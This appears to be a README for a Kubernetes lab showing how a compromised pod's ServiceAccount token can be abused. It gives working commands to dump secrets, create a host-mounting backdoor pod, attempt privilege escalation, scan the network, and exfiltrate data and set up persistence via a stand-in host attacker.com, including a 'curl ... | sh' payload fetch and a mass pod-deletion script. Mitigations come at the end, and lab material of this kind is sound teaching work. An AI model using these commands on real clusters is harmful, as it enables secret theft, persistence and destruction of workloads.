# ServiceAccount Token Abuse

This example demonstrates how a compromised pod can use its ServiceAccount token to access the Kubernetes API and escalate privileges.

## Attack Scenario
- The pod uses the public.aws.ecr/docker/library/alpine:3.22 image.
- The container reads its ServiceAccount token and uses it to access the Kubernetes API.
- Attacker can list secrets, create pods, etc., depending on RBAC.

## Deployment
```bash
# Deploy all resources (ServiceAccount, Role, RoleBinding, Pod)
make apply
# or
kubectl apply -f .

# Wait for the pod to be running
kubectl get pod sa-token-alpine

# Verify the ServiceAccount and permissions
kubectl get serviceaccount attacker-sa
kubectl get role attacker-role
kubectl get rolebinding attacker-rolebinding
```

## Attack Demonstration Commands

### 1. Access ServiceAccount Token
```bash
# Exec into the pod
kubectl exec -it sa-token-alpine -- sh

# Install necessary tools
apk add --no-cache curl jq

# Access the ServiceAccount token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
echo "ServiceAccount token: $TOKEN"

# Get the namespace
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
echo "Namespace: $NAMESPACE"

# Get the API server URL
KUBERNETES_SERVICE_HOST=https://kubernetes.default.svc
echo "API Server: $KUBERNETES_SERVICE_HOST"
```

### 2. API Discovery and Enumeration
```bash
# Test API access
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/pods

# Get API server version
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/version

# List available API resources
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1 | jq '.resources[] | select(.names | length > 0)'

# Discover all API groups
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/apis | jq '.groups[].name'
```

### 3. Enumerate Current Permissions
```bash
# Check what we can do in current namespace
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/pods

# Try to list secrets (should work based on our Role)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/secrets

# Try to create a pod (should work based on our Role)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/pods

# Check self-access rules
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -X POST -H "Content-Type: application/json" \
  -d '{"spec":{"resourceAttributes":{"verb":"get","resource":"secrets","namespace":"'$NAMESPACE'"}}}'
```

### 4. Secret Extraction
```bash
# List all secrets in the namespace
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/secrets | jq '.items[].metadata.name'

# Extract a specific secret (e.g., default token)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/secrets/default-token-* | \
  jq '.items[0].data.token' | base64 -d

# Extract all secrets data
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/secrets | \
  jq '.items[] | {name: .metadata.name, data: .data}'

# Look for registry credentials
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/secrets | \
  jq '.items[] | select(.metadata.name | contains("registry"))'
```

### 5. Pod Creation for Persistence
```bash
# Create a malicious pod with elevated privileges
cat > malicious-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: backdoor-pod
  labels:
    app: backdoor
spec:
  serviceAccountName: attacker-sa
  containers:
  - name: backdoor
    image: public.aws.ecr/docker/library/alpine:3.22
    command: ["sleep", "3600"]
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
EOF

# Create the pod using the API
curl -k -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/yaml" \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/pods \
  --data-binary @malicious-pod.yaml

# Or use kubectl from within the pod (if available)
echo "$TOKEN" > /tmp/token
echo "$NAMESPACE" > /tmp/namespace
```

### 6. Cluster Enumeration
```bash
# List all namespaces
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces | jq '.items[].metadata.name'

# List nodes (may not be accessible)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/nodes | jq '.items[].metadata.name' 2>/dev/null || echo "Cannot access nodes"

# List all pods in all namespaces
for ns in $(curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces | jq -r '.items[].metadata.name'); do
  echo "=== Namespace: $ns ==="
  curl -k -H "Authorization: Bearer $TOKEN" \
    https://kubernetes.default.svc/api/v1/namespaces/$ns/pods | \
    jq '.items[].metadata.name' 2>/dev/null || echo "Cannot access pods in $ns"
done
```

### 7. Privilege Escalation Attempts
```bash
# Try to create a ClusterRole (likely to fail)
cat > cluster-role.yaml << 'EOF'
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: escalation-role
rules:
- apiGroups: [""]
  resources: ["*"]
  verbs: ["*"]
EOF

curl -k -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/yaml" \
  https://kubernetes.default.svc/apis/rbac.authorization.k8s.io/v1/clusterroles \
  --data-binary @cluster-role.yaml

# Try to create pods in other namespaces
curl -k -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  https://kubernetes.default.svc/api/v1/namespaces/kube-system/pods \
  -d '{"metadata":{"name":"test-pod"},"spec":{"containers":[{"name":"test","image":"alpine"}]}}'

# Try to access kube-system secrets
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets
```

### 8. Lateral Movement
```bash
# Create a pod that can access other services
cat > discovery-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: discovery-pod
spec:
  serviceAccountName: attacker-sa
  containers:
  - name: discovery
    image: public.aws.ecr/docker/library/alpine:3.22
    command: ["sleep", "3600"]
    env:
    - name: TOKEN
      valueFrom:
        secretKeyRef:
          name: attacker-sa-token
          key: token
EOF

# Install nmap for network discovery
apk add --no-cache nmap

# Scan the cluster network
nmap -sT -p 80,443,8080,6443,10250,10255 10.0.0.0/24

# Try to access other pods directly
curl -k http://kubernetes.default.svc/api/v1/namespaces/default/services
```

### 9. Data Exfiltration
```bash
# Extract all secrets and save to file
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/secrets > /tmp/secrets.json

# Extract all pod configurations
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/pods > /tmp/pods.json

# Create a compressed archive of stolen data
tar -czf /tmp/exfiltrated-data.tar.gz /tmp/*.json

# Exfiltrate data (example with curl to external server)
# curl -X POST -F "file=@/tmp/exfiltrated-data.tar.gz" http://attacker.com/upload
```

### 10. Persistence and Backdoors
```bash
# Create a cron job for persistence
cat > cronjob.yaml << 'EOF'
apiVersion: batch/v1
kind: CronJob
metadata:
  name: persistence-cron
spec:
  schedule: "*/5 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          serviceAccountName: attacker-sa
          containers:
          - name: backdoor
            image: public.aws.ecr/docker/library/alpine:3.22
            command: ["sh", "-c", "curl http://attacker.com/heartbeat.sh"]
          restartPolicy: OnFailure
EOF

curl -k -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/yaml" \
  https://kubernetes.default.svc/apis/batch/v1/namespaces/$NAMESPACE/cronjobs \
  --data-binary @cronjob.yaml

# Create a ConfigMap with malicious scripts
cat > malicious-configmap.yaml << 'EOF'
apiVersion: v1
kind: ConfigMap
metadata:
  name: malicious-scripts
data:
  backdoor.sh: |
    #!/bin/sh
    curl http://attacker.com/payload.sh | sh
  cleanup.sh: |
    #!/bin/sh
    kubectl delete pod --all -n $NAMESPACE
EOF

curl -k -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/yaml" \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/configmaps \
  --data-binary @malicious-configmap.yaml
```

## Verification Commands
```bash
# Verify the ServiceAccount token is accessible
kubectl exec sa-token-alpine -- cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Check RBAC permissions
kubectl auth can-i get pods --as system:serviceaccount:$NAMESPACE:attacker-sa
kubectl auth can-i get secrets --as system:serviceaccount:$NAMESPACE:attacker-sa
kubectl auth can-i create pods --as system:serviceaccount:$NAMESPACE:attacker-sa

# Verify the pod is using the correct ServiceAccount
kubectl get pod sa-token-alpine -o jsonpath='{.spec.serviceAccountName}'
```

## Cleanup
```bash
# Remove all resources
make clean
# or
kubectl delete -f .

# Exit the pod shell
exit

# Verify cleanup
kubectl get serviceaccount attacker-sa 2>/dev/null || echo "ServiceAccount deleted"
kubectl get role attacker-role 2>/dev/null || echo "Role deleted"
kubectl get rolebinding attacker-rolebinding 2>/dev/null || echo "RoleBinding deleted"
kubectl get pod sa-token-alpine 2>/dev/null || echo "Pod deleted"
```

## Mitigation
- Use least-privilege RBAC for ServiceAccounts.
- Disable automounting ServiceAccount tokens if not needed (`automountServiceAccountToken: false`).
- Implement Pod Security Policies or Pod Security Admission.
- Use third-party admission controllers to enforce security policies.
- Regularly audit ServiceAccount permissions and RoleBindings.
- Monitor API server logs for unusual access patterns.
- Implement network policies to restrict pod-to-API communication.

## Files
- `pod.yaml`: Pod spec with ServiceAccount.
- `serviceaccount.yaml`: ServiceAccount definition.
- `role.yaml`: Role with permissions.
- `rolebinding.yaml`: RoleBinding to attach role to ServiceAccount.
- `Makefile`: Deploy/remove the example.
